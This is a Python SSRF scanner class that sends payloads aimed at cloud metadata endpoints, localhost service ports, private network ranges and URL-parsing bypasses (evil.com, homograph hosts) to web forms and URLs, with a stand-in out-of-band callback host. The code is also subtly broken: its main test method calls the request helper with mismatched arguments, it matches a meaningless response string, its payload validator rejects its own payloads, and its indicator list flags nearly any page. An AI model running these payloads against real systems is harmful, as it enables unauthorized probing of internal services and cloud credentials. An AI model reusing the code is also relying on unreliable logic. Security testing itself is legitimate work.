import requests
import logging
from urllib.parse import urljoin, urlparse
from typing import Optional, Dict, List, Union
import time

class SSRFScanner:
    """Advanced SSRF vulnerability scanner with comprehensive detection capabilities."""

    def __init__(self, driver=None, timeout: int = 10):
        """
        Initialize the SSRF scanner with configurable options.
        
        Args:
            driver: Optional WebDriver for browser-based testing
            timeout: Request timeout in seconds (default: 10)
        """
        self.driver = driver
        self.timeout = timeout
        self.vulnerable_endpoints = []
        
        # Enhanced payload list with various bypass techniques
        self.payloads = [
            # Basic localhost tests
            "http://127.0.0.1",
            "http://localhost",
            "http://0.0.0.0",
            
            # Cloud metadata endpoints
            "http://169.254.169.254",  # AWS
            "http://metadata.google.internal",  # GCP
            "http://169.254.169.254/metadata",  # Azure
            
            # Alternative encodings and bypass techniques
            "http://127.0.0.1:80@evil.com",
            "http://127.0.0.1#evil.com",
            "http://[::1]",
            "http://ⓛⓞⓒⓐⓛⓗⓞⓢⓣ",  # IDN homograph attack
            
            # Common service ports
            "http://127.0.0.1:22",    # SSH
            "http://127.0.0.1:3306",  # MySQL
            "http://127.0.0.1:5432",  # PostgreSQL
            "http://127.0.0.1:6379",  # Redis
            "http://127.0.0.1:8080",  # Common alt HTTP
            
            # Internal network ranges
            "http://192.168.1.1",
            "http://10.0.0.1",
            "http://172.16.0.1"
        ]
        
        # Out-of-band detection configuration
        self.oob_server = "http://oob.example.com"
        self.oob_payload = f"{self.oob_server}/?token={int(time.time())}"
        
        # Configure logging
        logging.basicConfig(
            filename='ssrf_scan.log',
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s'
        )

    def test_ssrf(self, form, url):
        """
        Test for SSRF vulnerabilities.
        """
        try:
            for payload in self.payloads:
                response = self._send_request(url, form, payload)
                if "Valid SSRF response" in response.text:
                    return True
        except Exception as e:
            logging.error(f"SSRF test failed: {e}")
        return False

    def _prepare_targets(self, form: Optional[Dict], url: Optional[str]) -> List[tuple]:
        """Prepare test targets from form and URL inputs."""
        targets = []
        
        if form:
            if not isinstance(form, dict):
                logging.error("Invalid form structure")
                return []
                
            base_url = url if url else "http://example.com"
            action = form.get("action", "")
            
            try:
                target_url = urljoin(base_url, action)
                if not self._is_valid_url(target_url):
                    return []
                    
                # Prepare test data for form inputs
                test_data = {}
                for input_field in form.get("inputs", []):
                    name = input_field.get("name", "")
                    if name:
                        test_data[name] = "test"
                
                targets.append((target_url, test_data))
                
            except Exception as e:
                logging.error(f"Error preparing form target: {str(e)}")
                
        if url and self._is_valid_url(url):
            targets.append((url, None))
            
        return targets

    def _get_payloads(self, base_url: str) -> List[str]:
        """Generate payloads including domain-specific variants."""
        parsed = urlparse(base_url)
        domain_payloads = [
            f"http://127.0.0.1@{parsed.netloc}",
            f"http://{parsed.netloc}@127.0.0.1",
            f"http://{parsed.netloc}.127.0.0.1"
        ]
        return self.payloads + domain_payloads + [self.oob_payload]

    def _test_payload(self, url: str, payload: str, test_data: Optional[Dict]) -> bool:
        """Test a single SSRF payload against a target."""
        try:
            # Prepare test parameters
            if test_data:
                # Form submission test
                modified_data = {k: payload for k, v in test_data.items()}
                method = "POST"
            else:
                # Direct URL test
                modified_url = url.replace(urlparse(url).netloc, payload)
                method = "GET"
                
            # Make the test request
            if method == "POST":
                response = requests.post(
                    url,
                    data=modified_data,
                    timeout=self.timeout,
                    allow_redirects=False,
                    headers={"User-Agent": "SSRF-Test-Scanner"}
                )
            else:
                response = requests.get(
                    modified_url,
                    timeout=self.timeout,
                    allow_redirects=False,
                    headers={
                        "User-Agent": "SSRF-Test-Scanner",
                        "Host": payload
                    }
                )
                
            # Check for SSRF indicators
            return self._check_ssrf_indicators(response, payload)
            
        except requests.RequestException as e:
            logging.debug(f"Payload test failed: {str(e)}")
            return False

    def _test_oob_detection(self, targets: List[tuple]) -> bool:
        """Test for out-of-band SSRF vulnerabilities."""
        try:
            # Implementation for OOB testing would go here
            # This would involve checking your OOB server for callbacks
            return False
        except Exception as e:
            logging.error(f"OOB test failed: {str(e)}")
            return False

    def _check_ssrf_indicators(self, response, payload: str) -> bool:
        """Check response for signs of SSRF vulnerability."""
        if response.status_code not in [200, 201, 202, 301, 302, 307, 308]:
            return False
            
        content = response.text.lower()
        indicators = [
            "localhost",
            "127.0.0.1",
            "internal",
            "private",
            "metadata",
            "aws",
            "gcp",
            "azure",
            payload.lower(),
            "192.168.",
            "10.",
            "172.16.",
            "169.254."
        ]
        
        # Check for any indicator in response
        return any(indicator in content for indicator in indicators)

    def _is_valid_url(self, url: str) -> bool:
        """Validate URL format and safety."""
        try:
            if not isinstance(url, str) or not url.strip():
                return False
                
            result = urlparse(url)
            if not all([result.scheme, result.netloc]):
                return False
                
            # Block dangerous schemes
            if result.scheme not in ['http', 'https']:
                return False
                
            # Block known malicious patterns
            bad_patterns = [
                "://localhost",
                "://127.0.0.1",
                "://0.0.0.0",
                "://[::1]"
            ]
            if any(p in url.lower() for p in bad_patterns):
                return False
                
            return True
            
        except ValueError:
            return False

    def _log_vulnerability(self, url: str, payload: str, test_data: Optional[Dict]):
        """Log discovered vulnerabilities."""
        entry = {
            'url': url,
            'payload': payload,
            'test_data': test_data,
            'timestamp': time.strftime("%Y-%m-%d %H:%M:%S")
        }
        self.vulnerable_endpoints.append(entry)
        logging.warning(f"SSRF vulnerability found at {url} with payload: {payload}")

    def validate_payloads(self) -> bool:
        """Validate all payloads are properly formatted."""
        return all(self._is_valid_url(p) for p in self.payloads)

    def _send_request(self, url, method="GET", data=None):
        """Send HTTP request for SSRF testing."""
        try:
            if method.upper() == "GET":
                return requests.get(url, timeout=10)
            elif method.upper() == "POST":
                return requests.post(url, data=data, timeout=10)
        except requests.RequestException as e:
            logging.error(f"SSRF test failed: {e}")
            return None